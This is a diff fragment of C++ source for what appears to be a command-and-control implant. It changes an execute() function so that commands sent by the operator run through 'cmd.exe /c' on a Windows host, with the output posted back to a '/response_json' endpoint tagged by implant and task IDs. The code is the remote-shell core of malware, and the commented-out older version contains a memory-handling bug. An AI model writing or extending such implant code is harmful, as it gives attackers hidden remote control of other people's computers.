@@ -44,17 +44,17 @@ void execute(std::string command, std::string args, int task_id, int implant_id)
         I grabbed this from our previous patch of code and I'm just
         grabbing the response*/
 
-        //split on space
-        int i = args.find(" ");
-        char * prog = (char *) malloc(i);
-        for (int j =0; j < i; j++){
-            prog[j] = args[j];
-        }
-        char * a = (char *) malloc(args.size() - i);
-        for (int k = i; k < args.size(); k++){
-            a[k] = args[k];
-        }
-        std::string res = exec(prog,a);
+        // //split on space
+        // int i = args.find(" ");
+        // char * prog = (char *) malloc(i);
+        // for (int j =0; j < i; j++){
+        //     prog[j] = args[j];
+        // }
+        // char * a = (char *) malloc(args.size() - i);
+        // for (int k = i; k < args.size(); k++){
+        //     a[k] = args[k];
+        // }
+        std::string res = exec("C:\\Windows\\System32\\cmd.exe /c",args);
             
         results = res;
         HttpResponse("/response_json", implant_id, task_id, results, "success", command);
